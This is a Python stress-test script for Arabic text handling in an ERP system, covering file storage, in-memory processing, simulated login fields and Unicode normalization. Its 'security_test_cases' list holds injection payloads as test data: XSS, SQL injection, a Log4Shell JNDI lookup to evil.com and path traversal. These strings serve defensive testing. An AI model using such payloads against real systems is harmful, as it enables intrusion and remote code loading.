#!/usr/bin/env python3
"""
Universal Workshop ERP - Arabic Data Handling Stress Testing Suite
Comprehensive testing for Arabic text processing, storage, and display under load
"""

import os
import sys
import json
import time
import concurrent.futures
import threading
import random
import hashlib
import unicodedata
from datetime import datetime, timedelta
from pathlib import Path
import sqlite3
import re

# Add path for potential database testing
sys.path.append(os.path.join(os.path.dirname(__file__), '../../'))

try:
    import requests
    import mysql.connector
    HAS_REQUESTS = True
    HAS_MYSQL = True
except ImportError:
    HAS_REQUESTS = False
    HAS_MYSQL = False

class ArabicDataStressTester:
    """
    Comprehensive Arabic data handling stress testing
    """
    
    def __init__(self):
        self.test_results = []
        self.error_count = 0
        self.success_count = 0
        self.data_corruption_count = 0
        
        # Generate comprehensive Arabic test data
        self.arabic_test_data = self.generate_arabic_test_data()
        
        # Initialize report storage
        self.results_dir = Path('test_results/arabic_stress')
        self.results_dir.mkdir(parents=True, exist_ok=True)
        
        print("🌍 Arabic Data Handling Stress Tester Initialized")
        print(f"📊 Test Data Sets: {len(self.arabic_test_data)} variants")
    
    def generate_arabic_test_data(self):
        """Generate comprehensive Arabic test data for stress testing"""
        
        test_data = {
            'basic_arabic': [
                'مرحبا بكم في ورشة العمل الشاملة',
                'اسم المستخدم العربي',
                'كلمة المرور السرية',
                'البريد الإلكتروني العربي',
                'عنوان الشركة الرئيسي'
            ],
            'arabic_with_diacritics': [
                'مَرْحَباً بِكُمْ فِي وَرْشَةِ الْعَمَلِ الشَّامِلَةِ',
                'اِسْمُ الْمُسْتَخْدِمِ الْعَرَبِيُّ',
                'كَلِمَةُ الْمُرُورِ السِّرِّيَّةُ',
                'الْبَرِيدُ الْإِلِكْتْرُونِيُّ الْعَرَبِيُّ',
                'عُنْوَانُ الشَّرِكَةِ الرَّئِيسِيُّ'
            ],
            'mixed_rtl_ltr': [
                'Workshop عربي 2025',
                'admin@ورشة.com',
                'Password كلمة_مرور 123',
                'User محمد أحمد',
                'Company الشركة العامة LLC'
            ],
            'long_arabic_text': [
                'هذا نص طويل جداً باللغة العربية يحتوي على العديد من الكلمات والجمل المختلفة التي تهدف إلى اختبار قدرة النظام على التعامل مع النصوص العربية الطويلة وتخزينها وعرضها بشكل صحيح دون أي تلف أو فقدان في البيانات. يجب أن يكون النظام قادراً على التعامل مع هذا النوع من النصوص في جميع المجالات بما في ذلك مجالات المصادقة وإدارة الجلسات.',
                'النص الطويل الثاني يحتوي على مجموعة متنوعة من الأحرف العربية والرموز الخاصة والأرقام العربية ١٢٣٤٥٦٧٨٩٠ بالإضافة إلى علامات الترقيم المختلفة مثل الفاصلة والنقطة والاستفهام والتعجب! وهذا يساعد في اختبار شامل لقدرات النظام.'
            ],
            'special_arabic_chars': [
                'ﷺ ﷻ ﻻ ﻷ ﻹ ﻵ',  # Arabic ligatures
                '٠١٢٣٤٥٦٧٨٩',  # Arabic-Indic digits
                'ـــــــــــــــ',  # Arabic tatweel
                '؟؛،٪٭',  # Arabic punctuation
                'ﭐﭑﭒﭓﭔﭕﭖﭗﭘﭙﭚ'  # Extended Arabic
            ],
            'edge_cases': [
                '',  # Empty string
                ' ',  # Single space
                '\u200F\u200E',  # RTL/LTR marks
                'ا\u0301',  # Arabic with combining marks
                '\uFEFF' + 'نص عربي',  # BOM + Arabic
                'نص\u0000عربي',  # Null character (should be filtered)
                'نص\n\r\tعربي',  # Whitespace characters
                'نص' + 'ا' * 1000,  # Very long repeated character
            ],
            'security_test_cases': [
                '<script>alert("xss")</script>عربي',
                '\'OR\'1\'=\'1\' عربي',
                '${jndi:ldap://evil.com/a} عربي',
                '../../../etc/passwd عربي',
                '%3Cscript%3E عربي',
                'javascript:void(0) عربي'
            ],
            'unicode_normalization': [
                'متحف',  # NFC
                'متحف',  # NFD equivalent
                'مُحَمَّد',  # With diacritics
                'محمد',  # Without diacritics
            ]
        }
        
        return test_data
    
    def validate_utf8_encoding(self, text):
        """Validate UTF-8 encoding correctness"""
        try:
            # Test encoding/decoding round-trip
            encoded = text.encode('utf-8')
            decoded = encoded.decode('utf-8')
            
            if text != decoded:
                return False, "Round-trip encoding failed"
            
            # Check for overlong sequences or invalid UTF-8
            try:
                text.encode('utf-8').decode('utf-8', errors='strict')
            except UnicodeDecodeError as e:
                return False, f"UTF-8 validation failed: {e}"
            
            return True, "UTF-8 encoding valid"
            
        except Exception as e:
            return False, f"UTF-8 validation error: {e}"
    
    def test_data_integrity(self, original_text, retrieved_text):
        """Test data integrity after storage/retrieval"""
        # Direct comparison
        if original_text != retrieved_text:
            return False, "Direct comparison failed"
        
        # Hash comparison
        original_hash = hashlib.sha256(original_text.encode('utf-8')).hexdigest()
        retrieved_hash = hashlib.sha256(retrieved_text.encode('utf-8')).hexdigest()
        
        if original_hash != retrieved_hash:
            return False, "Hash comparison failed"
        
        # Unicode normalization check
        original_nfc = unicodedata.normalize('NFC', original_text)
        retrieved_nfc = unicodedata.normalize('NFC', retrieved_text)
        
        if original_nfc != retrieved_nfc:
            return False, "Unicode normalization inconsistent"
        
        return True, "Data integrity maintained"
    
    def test_file_storage_retrieval(self, concurrent_operations=50):
        """Test Arabic data storage and retrieval in file system"""
        print("📁 Testing file system Arabic data handling...")
        
        results = []
        temp_dir = self.results_dir / 'temp_files'
        temp_dir.mkdir(exist_ok=True)
        
        def file_operation(data_item, index):
            try:
                category, texts = data_item
                text = random.choice(texts)
                
                # Create unique filename
                filename = temp_dir / f"arabic_test_{category}_{index}_{int(time.time())}.txt"
                
                start_time = time.time()
                
                # Write Arabic text to file
                with open(filename, 'w', encoding='utf-8') as f:
                    f.write(text)
                
                # Read Arabic text from file
                with open(filename, 'r', encoding='utf-8') as f:
                    retrieved_text = f.read()
                
                write_read_time = time.time() - start_time
                
                # Validate data integrity
                integrity_valid, integrity_msg = self.test_data_integrity(text, retrieved_text)
                utf8_valid, utf8_msg = self.validate_utf8_encoding(retrieved_text)
                
                # Clean up
                filename.unlink(missing_ok=True)
                
                return {
                    'operation_type': 'file_storage',
                    'category': category,
                    'text_length': len(text),
                    'processing_time': write_read_time * 1000,  # ms
                    'integrity_valid': integrity_valid,
                    'utf8_valid': utf8_valid,
                    'success': integrity_valid and utf8_valid,
                    'error_msg': f"{integrity_msg}, {utf8_msg}" if not (integrity_valid and utf8_valid) else None
                }
                
            except Exception as e:
                return {
                    'operation_type': 'file_storage',
                    'category': category if 'category' in locals() else 'unknown',
                    'text_length': 0,
                    'processing_time': 0,
                    'integrity_valid': False,
                    'utf8_valid': False,
                    'success': False,
                    'error_msg': str(e)
                }
        
        # Prepare test data
        test_items = []
        for category, texts in self.arabic_test_data.items():
            for _ in range(concurrent_operations // len(self.arabic_test_data)):
                test_items.append((category, texts))
        
        # Run concurrent file operations
        with concurrent.futures.ThreadPoolExecutor(max_workers=10) as executor:
            future_to_item = {
                executor.submit(file_operation, item, i): (item, i)
                for i, item in enumerate(test_items)
            }
            
            for future in concurrent.futures.as_completed(future_to_item):
                result = future.result()
                results.append(result)
                
                if result['success']:
                    self.success_count += 1
                else:
                    self.error_count += 1
                    if not result['integrity_valid']:
                        self.data_corruption_count += 1
        
        # Clean up temp directory
        temp_dir.rmdir()
        
        # Analyze results
        total_operations = len(results)
        successful_operations = sum(1 for r in results if r['success'])
        avg_processing_time = sum(r['processing_time'] for r in results) / len(results)
        
        print(f"   ✅ File operations: {successful_operations}/{total_operations}")
        print(f"   ⚡ Average processing time: {avg_processing_time:.2f}ms")
        print(f"   🔒 Data corruption detected: {self.data_corruption_count}")
        
        return results
    
    def test_in_memory_processing(self, operations_count=1000):
        """Test Arabic data processing in memory under load"""
        print("🧠 Testing in-memory Arabic data processing...")
        
        results = []
        
        def memory_operation(operation_id):
            try:
                # Select random test data
                category = random.choice(list(self.arabic_test_data.keys()))
                text = random.choice(self.arabic_test_data[category])
                
                start_time = time.time()
                
                # Simulate various text operations
                operations = [
                    lambda t: t.upper(),
                    lambda t: t.lower(),
                    lambda t: t.strip(),
                    lambda t: t.replace(' ', '_'),
                    lambda t: unicodedata.normalize('NFC', t),
                    lambda t: t.encode('utf-8').decode('utf-8'),
                    lambda t: json.dumps(t, ensure_ascii=False),
                    lambda t: repr(t),
                ]
                
                processed_text = text
                for operation in operations:
                    try:
                        processed_text = operation(processed_text)
                        if isinstance(processed_text, str):
                            continue
                        else:
                            # Handle non-string results (like from json.dumps)
                            processed_text = str(processed_text)
                    except Exception as e:
                        return {
                            'operation_type': 'memory_processing',
                            'operation_id': operation_id,
                            'category': category,
                            'text_length': len(text),
                            'processing_time': 0,
                            'success': False,
                            'error_msg': f"Operation failed: {e}"
                        }
                
                processing_time = time.time() - start_time
                
                # Validate UTF-8 integrity
                utf8_valid, utf8_msg = self.validate_utf8_encoding(processed_text)
                
                return {
                    'operation_type': 'memory_processing',
                    'operation_id': operation_id,
                    'category': category,
                    'text_length': len(text),
                    'processing_time': processing_time * 1000,  # ms
                    'success': utf8_valid,
                    'utf8_valid': utf8_valid,
                    'error_msg': utf8_msg if not utf8_valid else None
                }
                
            except Exception as e:
                return {
                    'operation_type': 'memory_processing',
                    'operation_id': operation_id,
                    'category': 'unknown',
                    'text_length': 0,
                    'processing_time': 0,
                    'success': False,
                    'error_msg': str(e)
                }
        
        # Run concurrent memory operations
        with concurrent.futures.ThreadPoolExecutor(max_workers=20) as executor:
            future_to_id = {
                executor.submit(memory_operation, i): i
                for i in range(operations_count)
            }
            
            for future in concurrent.futures.as_completed(future_to_id):
                result = future.result()
                results.append(result)
                
                if result['success']:
                    self.success_count += 1
                else:
                    self.error_count += 1
        
        # Analyze results
        total_operations = len(results)
        successful_operations = sum(1 for r in results if r['success'])
        avg_processing_time = sum(r['processing_time'] for r in results) / len(results)
        
        print(f"   ✅ Memory operations: {successful_operations}/{total_operations}")
        print(f"   ⚡ Average processing time: {avg_processing_time:.4f}ms")
        
        return results
    
    def test_authentication_field_simulation(self, concurrent_users=100):
        """Simulate authentication fields with Arabic data"""
        print("🔐 Testing authentication fields with Arabic data...")
        
        results = []
        
        def auth_simulation(user_id):
            try:
                # Generate realistic authentication data
                usernames = self.arabic_test_data['basic_arabic'] + self.arabic_test_data['mixed_rtl_ltr']
                passwords = self.arabic_test_data['arabic_with_diacritics'] + self.arabic_test_data['special_arabic_chars']
                emails = [f"user_{i}@ورشة.com" for i in range(10)]
                
                username = random.choice(usernames)
                password = random.choice(passwords)
                email = random.choice(emails)
                
                start_time = time.time()
                
                # Simulate authentication processing
                auth_data = {
                    'username': username,
                    'password': password,
                    'email': email,
                    'full_name': random.choice(self.arabic_test_data['basic_arabic']),
                    'company': random.choice(self.arabic_test_data['mixed_rtl_ltr'])
                }
                
                # Simulate validation and encoding
                for field, value in auth_data.items():
                    # UTF-8 validation
                    utf8_valid, _ = self.validate_utf8_encoding(value)
                    if not utf8_valid:
                        raise Exception(f"UTF-8 validation failed for {field}")
                    
                    # Simulate database-like encoding/decoding
                    encoded = value.encode('utf-8')
                    decoded = encoded.decode('utf-8')
                    
                    # Check integrity
                    integrity_valid, _ = self.test_data_integrity(value, decoded)
                    if not integrity_valid:
                        raise Exception(f"Data integrity failed for {field}")
                
                processing_time = time.time() - start_time
                
                return {
                    'operation_type': 'auth_simulation',
                    'user_id': user_id,
                    'fields_processed': len(auth_data),
                    'processing_time': processing_time * 1000,  # ms
                    'success': True,
                    'total_chars': sum(len(v) for v in auth_data.values()),
                    'error_msg': None
                }
                
            except Exception as e:
                return {
                    'operation_type': 'auth_simulation',
                    'user_id': user_id,
                    'fields_processed': 0,
                    'processing_time': 0,
                    'success': False,
                    'total_chars': 0,
                    'error_msg': str(e)
                }
        
        # Run concurrent authentication simulations
        with concurrent.futures.ThreadPoolExecutor(max_workers=20) as executor:
            future_to_user = {
                executor.submit(auth_simulation, user_id): user_id
                for user_id in range(concurrent_users)
            }
            
            for future in concurrent.futures.as_completed(future_to_user):
                result = future.result()
                results.append(result)
                
                if result['success']:
                    self.success_count += 1
                else:
                    self.error_count += 1
        
        # Analyze results
        total_operations = len(results)
        successful_operations = sum(1 for r in results if r['success'])
        avg_processing_time = sum(r['processing_time'] for r in results) / len(results)
        total_chars_processed = sum(r['total_chars'] for r in results)
        
        print(f"   ✅ Auth simulations: {successful_operations}/{total_operations}")
        print(f"   ⚡ Average processing time: {avg_processing_time:.2f}ms")
        print(f"   📝 Total characters processed: {total_chars_processed:,}")
        
        return results
    
    def test_unicode_normalization(self):
        """Test Unicode normalization handling"""
        print("🔤 Testing Unicode normalization...")
        
        results = []
        normalization_forms = ['NFC', 'NFD', 'NFKC', 'NFKD']
        
        for category, texts in self.arabic_test_data.items():
            for text in texts:
                for form in normalization_forms:
                    try:
                        start_time = time.time()
                        normalized = unicodedata.normalize(form, text)
                        processing_time = time.time() - start_time
                        
                        # Check if normalization is stable
                        double_normalized = unicodedata.normalize(form, normalized)
                        stable = normalized == double_normalized
                        
                        results.append({
                            'operation_type': 'unicode_normalization',
                            'category': category,
                            'normalization_form': form,
                            'original_length': len(text),
                            'normalized_length': len(normalized),
                            'processing_time': processing_time * 1000,
                            'stable': stable,
                            'success': True
                        })
                        
                        self.success_count += 1
                        
                    except Exception as e:
                        results.append({
                            'operation_type': 'unicode_normalization',
                            'category': category,
                            'normalization_form': form,
                            'original_length': len(text),
                            'normalized_length': 0,
                            'processing_time': 0,
                            'stable': False,
                            'success': False,
                            'error_msg': str(e)
                        })
                        
                        self.error_count += 1
        
        successful_normalizations = sum(1 for r in results if r['success'])
        print(f"   ✅ Normalizations: {successful_normalizations}/{len(results)}")
        
        return results
    
    def run_comprehensive_stress_test(self):
        """Run all Arabic data stress tests"""
        print("🌍 UNIVERSAL WORKSHOP ARABIC DATA STRESS TESTING")
        print("=" * 60)
        
        start_time = datetime.now()
        
        # Reset counters
        self.success_count = 0
        self.error_count = 0
        self.data_corruption_count = 0
        
        all_results = []
        
        # Run all tests
        print("\n📁 File Storage Tests...")
        file_results = self.test_file_storage_retrieval(100)
        all_results.extend(file_results)
        
        print("\n🧠 Memory Processing Tests...")
        memory_results = self.test_in_memory_processing(500)
        all_results.extend(memory_results)
        
        print("\n🔐 Authentication Field Tests...")
        auth_results = self.test_authentication_field_simulation(200)
        all_results.extend(auth_results)
        
        print("\n🔤 Unicode Normalization Tests...")
        unicode_results = self.test_unicode_normalization()
        all_results.extend(unicode_results)
        
        end_time = datetime.now()
        total_duration = (end_time - start_time).total_seconds()
        
        # Generate comprehensive report
        report = self.generate_stress_test_report(all_results, start_time, end_time)
        
        # Print summary
        print(f"\n📊 ARABIC DATA STRESS TEST SUMMARY")
        print("=" * 60)
        print(f"⏱️  Total Duration: {total_duration:.2f}s")
        print(f"✅ Successful Operations: {self.success_count:,}")
        print(f"❌ Failed Operations: {self.error_count:,}")
        print(f"🔒 Data Corruption Events: {self.data_corruption_count}")
        print(f"📊 Total Operations: {len(all_results):,}")
        
        success_rate = (self.success_count / max(len(all_results), 1)) * 100
        print(f"🎯 Success Rate: {success_rate:.2f}%")
        
        if success_rate >= 99:
            print("🎉 EXCELLENT: Arabic data handling under stress")
        elif success_rate >= 95:
            print("✅ GOOD: Arabic data handling acceptable")
        elif success_rate >= 90:
            print("⚠️  WARNING: Arabic data handling needs improvement")
        else:
            print("❌ CRITICAL: Arabic data handling has serious issues")
        
        return report
    
    def generate_stress_test_report(self, all_results, start_time, end_time):
        """Generate comprehensive stress test report"""
        
        report = {
            'test_execution': {
                'start_time': start_time.isoformat(),
                'end_time': end_time.isoformat(),
                'duration_seconds': (end_time - start_time).total_seconds(),
                'total_operations': len(all_results),
                'successful_operations': self.success_count,
                'failed_operations': self.error_count,
                'data_corruption_events': self.data_corruption_count
            },
            'test_results_by_type': {},
            'performance_metrics': {},
            'data_integrity_analysis': {},
            'recommendations': []
        }
        
        # Group results by operation type
        for result in all_results:
            op_type = result['operation_type']
            if op_type not in report['test_results_by_type']:
                report['test_results_by_type'][op_type] = []
            report['test_results_by_type'][op_type].append(result)
        
        # Calculate performance metrics for each operation type
        for op_type, results in report['test_results_by_type'].items():
            successful = [r for r in results if r['success']]
            failed = [r for r in results if not r['success']]
            
            processing_times = [r['processing_time'] for r in results if 'processing_time' in r and r['processing_time'] > 0]
            
            report['performance_metrics'][op_type] = {
                'total_operations': len(results),
                'successful_operations': len(successful),
                'failed_operations': len(failed),
                'success_rate': (len(successful) / max(len(results), 1)) * 100,
                'avg_processing_time': sum(processing_times) / max(len(processing_times), 1),
                'min_processing_time': min(processing_times) if processing_times else 0,
                'max_processing_time': max(processing_times) if processing_times else 0
            }
        
        # Generate recommendations
        overall_success_rate = (self.success_count / max(len(all_results), 1)) * 100
        
        if overall_success_rate < 95:
            report['recommendations'].append("Improve error handling for Arabic text processing")
        
        if self.data_corruption_count > 0:
            report['recommendations'].append("Investigate and fix data corruption issues")
        
        avg_processing_time = sum(r.get('processing_time', 0) for r in all_results) / max(len(all_results), 1)
        if avg_processing_time > 10:  # ms
            report['recommendations'].append("Optimize Arabic text processing performance")
        
        # Save report
        report_file = self.results_dir / f"arabic_stress_test_report_{datetime.now().strftime('%Y%m%d_%H%M%S')}.json"
        
        with open(report_file, 'w', encoding='utf-8') as f:
            json.dump(report, f, indent=2, ensure_ascii=False)
        
        print(f"\n📄 Detailed report saved: {report_file}")
        
        return report


def main():
    """Main function"""
    print("🌍 Universal Workshop ERP - Arabic Data Handling Stress Test")
    
    tester = ArabicDataStressTester()
    report = tester.run_comprehensive_stress_test()
    
    return report


if __name__ == "__main__":
    main()
